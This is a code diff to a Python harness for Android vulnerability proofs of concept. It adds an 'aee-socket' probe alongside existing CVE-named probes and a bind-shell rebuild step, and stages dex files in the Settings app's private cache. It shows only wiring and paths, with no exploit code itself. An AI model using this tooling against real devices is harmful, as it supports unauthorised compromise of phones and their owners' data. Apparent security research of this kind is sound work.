@@ -20,6 +20,7 @@ XRP_WRAPPER_JAVA = (
     ROOT / "13-apusys-ioctl-surface" / "poc" / "XrpWrapperInspect.java"
 )
 GED_BRIDGE_JAVA = ROOT / "18-cve-2024-20118-mms" / "poc" / "GedBridgeProbe.java"
+AEE_SOCKET_JAVA = ROOT / "20-cve-2024-20032-aee" / "poc" / "AeeSocketProbe.java"
 DRM_TRIGGER_JAVA = ROOT / "07-cve-2023-32836-display-overflow" / "poc" / "DrmTrigger.java"
 REBUILD_BIND_SHELL = (
     ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "exploit.py"
@@ -27,6 +28,7 @@ REBUILD_BIND_SHELL = (
 DEFAULT_REMOTE_DEX = "/data/data/com.android.settings/cache/apusys_ioctl_probe.dex"
 DEFAULT_XRP_REMOTE_DEX = "/data/data/com.android.settings/cache/xrp_wrapper_inspect.dex"
 DEFAULT_GED_REMOTE_DEX = "/data/data/com.android.settings/cache/ged_bridge_probe.dex"
+DEFAULT_AEE_REMOTE_DEX = "/data/data/com.android.settings/cache/aee_socket_probe.dex"
 DEFAULT_RESULT_DIR = ROOT / "poc-run-results" / "2026-06-14-batch"
 
 
@@ -84,6 +86,8 @@ def probe_sources(probe):
         return "XrpWrapperInspect", [DRM_TRIGGER_JAVA, XRP_WRAPPER_JAVA]
     if probe == "ged-bridge":
         return "GedBridgeProbe", [DRM_TRIGGER_JAVA, GED_BRIDGE_JAVA]
+    if probe == "aee-socket":
+        return "AeeSocketProbe", [DRM_TRIGGER_JAVA, AEE_SOCKET_JAVA]
     raise RuntimeError(f"unknown probe: {probe}")
 
 
@@ -302,7 +306,8 @@ def main():
     parser.add_argument("--skip-rebuild-clean", action="store_true",
                         help="pass --skip-clean to rebuild_bind_shell.py")
     parser.add_argument("--android-jar")
-    parser.add_argument("--probe", choices=("apusys", "xrp-wrapper", "ged-bridge"),
+    parser.add_argument("--probe",
+                        choices=("apusys", "xrp-wrapper", "ged-bridge", "aee-socket"),
                         default="apusys")
     parser.add_argument("--mode", default="--run-cmd-vpu-guard")
     parser.add_argument("--remote-dex", default=DEFAULT_REMOTE_DEX)
@@ -325,6 +330,8 @@ def main():
         args.remote_dex = DEFAULT_XRP_REMOTE_DEX
     if args.probe == "ged-bridge" and args.remote_dex == DEFAULT_REMOTE_DEX:
         args.remote_dex = DEFAULT_GED_REMOTE_DEX
+    if args.probe == "aee-socket" and args.remote_dex == DEFAULT_REMOTE_DEX:
+        args.remote_dex = DEFAULT_AEE_REMOTE_DEX
 
     android_jar = find_android_jar(args.android_jar)
     build_dir = Path(args.build_dir)
